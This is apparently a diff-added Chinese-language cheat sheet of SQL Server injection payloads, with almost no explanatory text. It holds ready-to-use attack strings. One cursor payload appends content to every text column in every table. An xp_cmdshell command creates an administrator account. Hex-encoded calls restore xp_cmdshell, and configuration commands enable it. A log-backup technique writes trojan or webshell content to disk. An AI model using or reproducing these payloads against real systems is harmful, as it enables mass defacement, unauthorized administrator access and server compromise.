+;DECLARE @T VARCHAR(255),@C VARCHAR(255) DECLARE Table_Cursor CURSOR FOR SELECT a.name,b.name FROM sysobjects a,s yscolumns b WHERE a.id=b.id AND a.xtype='u' AND (b.xtype=99 OR b.xtype=35 OR b.xtype=231 OR b.xtype=167) OPEN Table_Cursor FETCH NEXT FROM Table_Cursor INTO @T,@C WHILE(@@FETCH_STATUS=0) BEGIN EXEC('UPDATE ['+@T+'] SET ['+@C+']=RTRIM(CONVERT(VARCHAR(4000),['+@C+']))+''<要插入的内容>''') FETCH NEXT FROM Table_Cursor INTO @T,@C END CLOSE Table_Cursor DEALLOCATE Table_Cursor--
+
+◆执行命令行(无结果返回)
+;exec master..xp_cmdshell 'net user name password /add & net localgroup administrators name /add'--
+
+◆恢复存储过程 xp_cmdshell
+;Exec Master..sp_dropextendedproc 0x780070005F0063006D0064007300680065006C006C00;Exec Master..sp_addextendedproc 0x780070005F0063006D0064007300680065006C006C00,0x78706C6F6737302E646C6C--
+
+◆SQLServer 2005 开启和关闭 xp_cmdshell
+;EXEC master..sp_configure 'show advanced options',1;RECONFIGURE;EXEC master..sp_configure 'xp_cmdshell',1;RECONFIGURE;
+
+关闭 xp_cmdshell
+;EXEC master..sp_configure 'show advanced options',1;RECONFIGURE;EXEC master..sp_configure 'xp_cmdshell',0;RECONFIGURE;
+
+◆SQLServer 2005 开启和关闭 OpenDataSource/OpenRowSet
+开启：
+;EXEC master..sp_configure 'show advanced options',1;RECONFIGURE;EXEC master..sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;
+关闭：
+;EXEC master..sp_configure 'show advanced options',1;RECONFIGURE;EXEC master..sp_configure 'Ad Hoc Distributed Queries',0;RECONFIGURE;
+
+◆SQLServer 2005 日志差异备份
+
+alter database [testdb] set recovery full
+declare @d nvarchar(4000) set @d=0x640062006200610063006B00 backup database __dbname__ to disk=@d with init--
+
+drop table [itpro]--
+create table [itpro]([a] image)--
+declare @d nvarchar(4000) set @d=0x640062006200610063006B00 backup log __dbname__ to disk=@d with init--
+
+insert into [itpro]([a]) values(__varchar(木马内容))--
+declare @d nvarchar(4000) set @d=__nvarchar(文件名) backup log __dbname__ to disk=@d with init--
+
+drop table [itpro] declare @d nvarchar(4000) set @d=0x640062006200610063006B00 backup log __dbname__ to disk=@d with init--
+
+
+
+
+
